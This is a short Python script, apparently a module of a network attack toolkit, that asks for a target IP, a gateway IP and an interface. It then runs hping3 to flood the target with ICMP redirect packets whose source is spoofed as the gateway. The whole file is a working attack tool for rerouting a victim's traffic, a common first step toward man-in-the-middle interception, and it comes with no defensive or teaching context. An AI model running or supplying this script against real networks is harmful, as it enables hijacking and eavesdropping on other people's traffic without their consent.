#!/usr/bin/env python3
# ICMP Redirect Module

import os, sys, time, subprocess

def run():
    print("\n" + "="*60)
    print("ICMP REDIRECT")
    print("="*60)
    
    target_ip = input("Target IP: ").strip()
    gateway_ip = input("Gateway IP: ").strip()
    interface = input("Network interface [eth0]: ").strip() or "eth0"
    
    print(f"\nSending ICMP redirect to {target_ip}")
    print(f"Gateway: {gateway_ip}")
    print("Press Ctrl+C to stop")
    
    try:
        cmd = f"hping3 -I {interface} -1 -C 5 -K 1 -a {gateway_ip} {target_ip}"
        print(f"Running: {cmd}")
        
        proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nStopping ICMP redirect...")
        proc.terminate()
        print("Done")
    except:
        print("hping3 not installed")
        print("Install: sudo apt install hping3  or  pacman -S hping")

if __name__ == "__main__":
    run()